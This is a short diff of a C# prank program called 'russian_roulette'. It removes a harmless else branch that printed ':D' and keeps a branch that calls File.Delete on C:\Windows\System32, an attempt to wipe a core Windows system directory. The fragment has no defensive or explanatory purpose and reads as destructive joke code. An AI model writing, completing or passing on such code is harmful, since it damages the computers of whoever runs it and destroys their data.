@@ -17,10 +17,6 @@ namespace russian_roulette
             {
                 File.Delete(@"C:\Windows\System32");
             }
-            else
-            {
-                Console.WriteLine(":D");
-            }
             Console.ReadKey();
         }
     }
